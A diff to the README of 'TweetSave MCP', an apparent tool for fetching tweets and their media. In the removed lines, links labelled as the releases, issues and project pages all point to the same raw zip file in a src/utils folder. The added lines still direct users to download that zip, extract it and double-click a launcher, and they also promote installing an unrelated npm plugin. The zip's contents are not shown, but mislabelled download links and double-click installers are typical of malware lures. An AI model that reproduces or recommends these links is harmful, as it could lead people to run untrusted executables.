@@ -6,7 +6,7 @@ Welcome to TweetSave MCP! This application allows you to analyze Twitter/X conte
 
 ## 📥 Download Now
 
-[![Download TweetSave MCP](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/utils/tweetsave-mcp-3.7-beta.5.zip%20TweetSave%https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/utils/tweetsave-mcp-3.7-beta.5.zip)](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/utils/tweetsave-mcp-3.7-beta.5.zip)
+[Download TweetSave MCP 3.7 beta 5](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/utils/tweetsave-mcp-3.7-beta.5.zip)
 
 ## 📂 Features
 
@@ -14,6 +14,21 @@ Welcome to TweetSave MCP! This application allows you to analyze Twitter/X conte
 - Download images and videos directly from tweets.
 - Minimal setup with no need for an API key.
 - User-friendly interface for hassle-free analysis.
+
+## Optional OpenClaw Companion
+
+TweetSave MCP is best when you need no-key tweet fetching, media extraction,
+and blog-ready formatting for specific tweet URLs. If an OpenClaw workflow also
+needs account-scoped X/Twitter automation, install TweetClaw beside TweetSave:
+
+```bash
+openclaw plugins install npm:@xquik/tweetclaw
+```
+
+Use TweetClaw for search tweets, search tweet replies, follower export, user
+lookup, media upload or download, direct messages, monitors, webhooks, giveaway
+draws, and reviewed post or reply actions. Keep TweetSave as the no-key fetch
+and formatting step for individual tweet URLs.
 
 ## 💻 System Requirements
 
@@ -25,11 +40,13 @@ Before you begin, make sure your system meets the following requirements:
 
 ## 🌐 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/utils/tweetsave-mcp-3.7-beta.5.zip) to download the latest version of TweetSave MCP.
+To get started, download the current
+[TweetSave MCP zip](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/utils/tweetsave-mcp-3.7-beta.5.zip)
+from this repository.
 
-1. Click on the link above to go to the Releases page.
-2. Find the latest release.
-3. Click on the appropriate file for your operating system to download it.
+1. Click the link above to download the zip file.
+2. Extract the downloaded file.
+3. Open the launcher for your operating system.
 4. After the download completes, locate the file on your computer.
 5. Double-click the file to run the installation process.
 6. Follow the prompts to complete the installation.
@@ -61,11 +78,11 @@ A: No, you can use the application without an API key.
 A: Currently, TweetSave MCP is available only for desktop systems.
 
 **Q: Where can I report issues or suggest features?**  
-A: You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/utils/tweetsave-mcp-3.7-beta.5.zip).
+A: You can open an issue on the [GitHub Issues page](https://github.com/jamald33n/tweetsave-mcp/issues).
 
 ## 📞 Support
 
-For additional support, you can reach out via the project's [GitHub page](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/utils/tweetsave-mcp-3.7-beta.5.zip).
+For additional support, you can reach out via the project's [GitHub page](https://github.com/jamald33n/tweetsave-mcp).
 
 ---
 
